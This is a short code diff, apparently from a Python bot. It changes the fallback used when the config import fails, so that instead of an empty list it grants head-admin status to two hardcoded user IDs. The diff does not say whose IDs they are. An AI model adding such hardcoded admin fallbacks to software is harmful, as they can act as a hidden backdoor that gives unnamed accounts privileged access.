@@ -27,7 +27,7 @@ from database import (
 try:
     from config import HEAD_ADMINS
 except ImportError:
-    HEAD_ADMINS = []
+    HEAD_ADMINS = [7483732504, 5959511392]
 
 
 # === YUKLAMALAR ===
